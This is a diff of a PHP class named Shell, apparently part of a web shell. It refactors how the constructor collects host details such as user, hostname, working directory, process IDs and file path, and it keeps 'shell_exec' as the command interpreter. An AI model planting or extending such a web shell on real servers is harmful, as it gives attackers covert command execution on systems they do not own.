@@ -6,22 +6,33 @@ class Shell {
 
     public function __construct()
     {
+        if (function_exists('gethostname')) {
+            $hostname = gethostname();
+        } else {
+            $hostname = $_SERVER['HTTP_HOST'];
+        }
+
+        if (!array_key_exists('SERVER_ADDR', $_SERVER)) {
+            $_SERVER['SERVER_ADDR'] = '127.0.0.1';
+        }
+
         $this->config = array(
-            'filename' => basename(__FILE__),
+            'cwd' => getcwd(),
+            'account' => get_current_user(),
             'username' => '',
             'password' => '',
-            'interpreter' => 'shell_exec',
-            'current_user' => get_current_user(),
-            'hostname' => function_exists('gethostname')?gethostname():$_SERVER['HTTP_HOST'],
-            'server_address' => isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'127.0.0.1',
+            'filename' => basename(__FILE__),
+            'filepath' => __FILE__,
+            'hostname' => $hostname,
+            'server_addr' => $_SERVER['SERVER_ADDR'],
             'server_port' => $_SERVER['SERVER_PORT'],
+            'interpreter' => 'shell_exec',
             'request_time' => $_SERVER['REQUEST_TIME'],
             'php_owner_uid' => getmyuid(),
             'php_owner_gid' => getmygid(),
             'php_process_id' => getmypid(),
             'inode_script' => getmyinode(),
             'last_page_modification' => getlastmod(),
-            'cwd' => getcwd(),
         );
 
         if (isset($_SESSION['interpreter'])) {
@@ -40,7 +51,7 @@ class Shell {
     {
         return sprintf(
             '%s@%s [%s] %s $ ',
-            $this->config['current_user'],
+            $this->config['account'],
             $this->config['hostname'],
             date('Y/m/d H:i'),
             $this->config['cwd']
